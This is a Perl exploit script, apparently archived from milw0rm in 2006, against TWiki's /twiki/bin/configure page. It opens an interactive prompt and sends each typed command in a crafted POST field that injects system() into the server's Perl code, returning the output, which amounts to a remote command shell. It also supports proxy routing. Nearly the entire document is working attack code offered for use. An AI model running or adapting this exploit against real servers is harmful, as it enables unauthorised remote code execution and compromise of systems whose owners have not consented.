#!/usr/bin/perl 
# Tue Aug  1 13:18:12 CEST 2006 jolascoaga@514.es
use strict;
use LWP::UserAgent;
use LWP::Simple;
use HTTP::Request;
use HTTP::Response;
use Getopt::Long;
$| = 1;   # couse 1 is bigger than 0
my ($proxy,$proxy_user,$proxy_pass);
my ($host,$debug,$dir, $command);
my $options = GetOptions (
  'host=s'	      => \$host, 
  'dir=s'	      => \$dir,
  'proxy=s'           => \$proxy,
  'proxy_user=s'      => \$proxy_user,
  'proxy_pass=s'      => \$proxy_pass,
  'debug'             => \$debug);
&help unless ($host); # you dont need root
$dir = "/twiki/bin/configure" unless($dir); # ... we have a template for this
print "$host - $dir\n";
while () {
		print "tinkiwinki> "; # phf haquerz style
		while(<STDIN>) {
				$command=$_;
				chomp($command);
				last;
		}
		&send($command);
}

sub send {
    my ($cmd) = @_;
    my $ok	=	0;
    my $socket;
    LWP::Debug::level('+') if $debug; # but remember this is crap :D
    my $ua = new LWP::UserAgent();   
    $ua->agent("safari/zoo"); 
    if ($host !~ /^http/) {
	$host = sprintf ("http://%s", $host); # CRAP CRAP CRAP
    }
    my $req = HTTP::Request->new(POST => $host.$dir);
    $req->content('action=update&TYPEOF%3A%29%3Bsystem%28%27'.$cmd.'%27%29%3Bmy+@a%3D%28=anything&submit=Submit');
    $ua->proxy(['http'] => $proxy) if $proxy;
    $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;
    print $req->as_string() if $debug; 
    my $res = $ua->request($req);
    my $html = $res->content(); 
    $html =~ m/<body.*?>(.*?)<div/si; # <pus>
    print $1."\n";
    if ($debug) {
		open (DEBG, ">wikidebug");
		print DEBG $html;
    }
}
sub help {
    print "Syntax: ./$0 --host=url --dir=/horde [options]\n";
    print "\t--proxy (http), --proxy_user, --proxy_pass\n";
    print "\t--debug\n";
    print "the default directory is /twiki/bin/configure\n";
    print "\nExample\n";
    print "bash# $0 --host=http(s)://www.server.com/\n";
    print "\n";
    exit(1);
}
exit 0;
# <END OF EXPLOIT>

# milw0rm.com [2006-08-07]
